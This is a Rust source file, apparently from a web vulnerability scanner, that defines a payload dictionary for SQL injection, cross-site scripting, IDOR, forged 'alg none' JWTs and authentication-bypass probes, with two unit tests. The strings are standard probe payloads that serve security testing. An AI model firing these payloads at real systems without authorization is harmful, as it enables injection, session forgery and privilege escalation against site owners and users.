/// A payload value produced by a `PayloadSource`, before it is bound to a
/// specific parameter.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PayloadTemplate {
    pub value: String,
    pub skill_name: String,
    pub description: String,
}

/// Supplies payload dictionaries for scan skills. `crates/skills` (phase 6)
/// composes on top of this trait.
pub trait PayloadSource: Send + Sync {
    fn payloads_for(&self, skill: &str) -> Vec<PayloadTemplate>;
    fn supported_skills(&self) -> Vec<String>;
}

/// Default lightweight payload dictionary covering the five built-in skills.
pub struct BuiltinPayloadSource;

impl PayloadSource for BuiltinPayloadSource {
    fn payloads_for(&self, skill: &str) -> Vec<PayloadTemplate> {
        match skill {
            "sqli" => sqli_payloads(),
            "xss" => xss_payloads(),
            "idor" => idor_payloads(),
            "jwt_attack" => jwt_attack_payloads(),
            "auth_bypass" => auth_bypass_payloads(),
            _ => Vec::new(),
        }
    }

    fn supported_skills(&self) -> Vec<String> {
        ["sqli", "xss", "idor", "jwt_attack", "auth_bypass"]
            .into_iter()
            .map(str::to_owned)
            .collect()
    }
}

fn template(skill: &str, value: &str, description: &str) -> PayloadTemplate {
    PayloadTemplate {
        value: value.to_owned(),
        skill_name: skill.to_owned(),
        description: description.to_owned(),
    }
}

fn sqli_payloads() -> Vec<PayloadTemplate> {
    vec![
        template("sqli", "' OR '1'='1", "classic tautology"),
        template("sqli", "\" OR \"1\"=\"1", "double-quote tautology"),
        template("sqli", "' OR 1=1--", "comment-terminated tautology"),
        template("sqli", "' UNION SELECT NULL--", "union-based probing"),
        template("sqli", "' AND 1=2--", "boolean-based probing"),
        template("sqli", "' AND SLEEP(3)--", "time-based probing"),
    ]
}

fn xss_payloads() -> Vec<PayloadTemplate> {
    vec![
        template("xss", "<script>alert(1)</script>", "script tag"),
        template("xss", "<img src=x onerror=alert(1)>", "event handler"),
        template("xss", "<svg/onload=alert(1)>", "svg onload"),
        template("xss", "javascript:alert(1)", "javascript scheme"),
        template("xss", "\"><script>alert(1)</script>", "attribute breakout"),
    ]
}

fn idor_payloads() -> Vec<PayloadTemplate> {
    vec![
        template("idor", "0", "zero id"),
        template("idor", "1", "first record"),
        template("idor", "999999", "large id"),
        template("idor", "-1", "negative id"),
        template("idor", "0000001", "leading-zero id"),
    ]
}

fn jwt_attack_payloads() -> Vec<PayloadTemplate> {
    vec![
        template(
            "jwt_attack",
            "eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.", // gitleaks:allow - test payload, alg none
            "alg none, empty signature",
        ),
        template(
            "jwt_attack",
            "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.c2ln",
            "guessable signature",
        ),
        template(
            "jwt_attack",
            "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.", // gitleaks:allow - test payload, alg none
            "alg none, admin role",
        ),
    ]
}

fn auth_bypass_payloads() -> Vec<PayloadTemplate> {
    vec![
        template("auth_bypass", "admin", "common admin name"),
        template("auth_bypass", "true", "boolean coercion"),
        template("auth_bypass", "1", "numeric coercion"),
        template("auth_bypass", "administrator", "full admin name"),
    ]
}

#[cfg(test)]
mod tests {
    use super::{BuiltinPayloadSource, PayloadSource};

    #[test]
    fn builtin_skills_have_payloads() {
        let source = BuiltinPayloadSource;
        let skills = source.supported_skills();
        assert!(skills.len() >= 5);
        for skill in &skills {
            assert!(
                !source.payloads_for(skill).is_empty(),
                "{skill} must ship payloads"
            );
        }
    }

    #[test]
    fn unknown_skill_has_no_payloads() {
        let source = BuiltinPayloadSource;
        assert!(source.payloads_for("nope").is_empty());
    }
}
